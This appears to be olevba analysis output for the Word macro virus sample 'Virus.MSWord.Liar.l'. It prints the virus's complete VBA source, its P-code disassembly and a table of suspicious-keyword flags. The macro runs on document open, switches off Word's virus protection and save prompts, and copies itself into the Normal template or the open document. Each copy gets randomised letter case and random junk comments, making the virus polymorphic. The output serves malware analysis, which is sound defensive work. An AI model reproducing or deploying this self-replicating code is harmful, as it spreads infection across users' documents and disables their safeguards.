olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar.l
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar.l - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open() '
Dim v(175): Options.VirusProtection = (Rnd * 0): Options.SaveNormalPrompt = (Rnd * 0) '
Set a = MacroContainer.VBProject: Set ab = a.VBComponents(1) '
Set abc = ab.CodeModule: Set s = NormalTemplate: t = Chr(39) '
If MacroContainer = s Then Set s = ActiveDocument '
Set nh = s.VBProject.VBComponents(1).CodeModule: li = abc.countoflines: y = 100 + Int(Rnd * 50) '
For i = 1 To li: jc = "": d = Int(Rnd * 3): p = InStr(abc.Lines(i, 1), t) '
If p = 1 And li > y Then '
d = 1: GoTo n_ '
End If '
l = UCase(Left(abc.Lines(i, 1), (p - 1))) '
For o = 1 To Len(l): f = Mid(l, o, 1) '
If Asc(f) < 90 And Asc(f) > 65 Then f = Chr(Asc(f) + Int(Rnd * 2) * 32) '
v(i) = v(i) & f: Next o '
For j = 1 To Int(75 - (Rnd * 20)): jc = jc & Chr(255 - Int(Rnd * 100)): Next j '
v(i) = v(i) & t & jc '
If d = 2 Then v(i) = v(i) & vbCr & t & jc '
vc = vc & v(i) & vbCr '
n_: '
Next i '
If nh.countoflines < (1 + 1 + 2) Then '
nh.deletelines 1, nh.countoflines: nh.addfromstring vc: nh.deletelines nh.countoflines, 1 '
If ActiveDocument.Saved = (Rnd * 0) Then ActiveDocument.SaveAs ActiveDocument.FullName '
End If '
End Sub '
Rem PiE by jack twoflower/Lz0/Meta '
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Liar.l
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3275 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' 	QuoteRem 0x001C 0x0000 ""
' Line #1:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x00AF 
' 	VarDefn v
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	QuoteRem 0x0056 0x0000 ""
' Line #2:
' 	SetStmt 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	Set a 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld a 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set ab 
' 	QuoteRem 0x003D 0x0000 ""
' Line #3:
' 	SetStmt 
' 	Ld ab 
' 	MemLd CodeModule 
' 	Set abc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set s 
' 	BoS 0x0000 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	St t 
' 	QuoteRem 0x003D 0x0000 ""
' Line #4:
' 	Ld MacroContainer 
' 	Ld s 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set s 
' 	EndIf 
' 	QuoteRem 0x0032 0x0000 ""
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld s 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nh 
' 	BoS 0x0000 
' 	Ld abc 
' 	MemLd countoflines 
' 	St li 
' 	BoS 0x0000 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Add 
' 	St y 
' 	QuoteRem 0x0060 0x0000 ""
' Line #6:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld li 
' 	For 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St jc 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	St d 
' 	BoS 0x0000 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld abc 
' 	ArgsMemLd Lines 0x0002 
' 	Ld t 
' 	FnInStr 
' 	St p 
' 	QuoteRem 0x004A 0x0000 ""
' Line #7:
' 	Ld p 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld li 
' 	Ld y 
' 	Gt 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x0019 0x0000 ""
' Line #8:
' 	LitDI2 0x0001 
' 	St d 
' 	BoS 0x0000 
' 	GoTo n_ 
' 	QuoteRem 0x000F 0x0000 ""
' Line #9:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0000 ""
' Line #10:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld abc 
' 	ArgsMemLd Lines 0x0002 
' 	Ld p 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St l 
' 	QuoteRem 0x002A 0x0000 ""
' Line #11:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld l 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld l 
' 	Ld o 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St False 
' 	QuoteRem 0x0026 0x0000 ""
' Line #12:
' 	Ld False 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x005A 
' 	Lt 
' 	Ld False 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0041 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld False 
' 	ArgsLd Asc 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0020 
' 	Mul 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St False 
' 	EndIf 
' 	QuoteRem 0x0048 0x0000 ""
' Line #13:
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Ld False 
' 	Concat 
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0018 0x0000 ""
' Line #14:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x004B 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	Paren 
' 	Sub 
' 	FnInt 
' 	For 
' 	BoS 0x0000 
' 	Ld jc 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St jc 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x004F 0x0000 ""
' Line #15:
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Ld t 
' 	Concat 
' 	Ld jc 
' 	Concat 
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	QuoteRem 0x0015 0x0000 ""
' Line #16:
' 	Ld d 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Ld vbCr 
' 	Concat 
' 	Ld t 
' 	Concat 
' 	Ld jc 
' 	Concat 
' 	Ld i 
' 	ArgsSt v 0x0001 
' 	EndIf 
' 	QuoteRem 0x002A 0x0000 ""
' Line #17:
' 	Ld vc 
' 	Ld i 
' 	ArgsLd v 0x0001 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St vc 
' 	QuoteRem 0x0016 0x0000 ""
' Line #18:
' 	Label n_ 
' 	QuoteRem 0x0004 0x0000 ""
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0007 0x0000 ""
' Line #20:
' 	Ld nh 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0002 
' 	Add 
' 	Paren 
' 	Lt 
' 	IfBlock 
' 	QuoteRem 0x0026 0x0000 ""
' Line #21:
' 	LitDI2 0x0001 
' 	Ld nh 
' 	MemLd countoflines 
' 	Ld nh 
' 	ArgsMemCall deletelines 0x0002 
' 	BoS 0x0000 
' 	Ld vc 
' 	Ld nh 
' 	ArgsMemCall addfromstring 0x0001 
' 	BoS 0x0000 
' 	Ld nh 
' 	MemLd countoflines 
' 	LitDI2 0x0001 
' 	Ld nh 
' 	ArgsMemCall deletelines 0x0002 
' 	QuoteRem 0x005A 0x0000 ""
' Line #22:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' 	QuoteRem 0x0057 0x0000 ""
' Line #23:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0000 ""
' Line #24:
' 	EndSub 
' 	QuoteRem 0x0008 0x0000 ""
' Line #25:
' 	Rem 0x0021 " PiE by jack twoflower/Lz0/Meta '"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

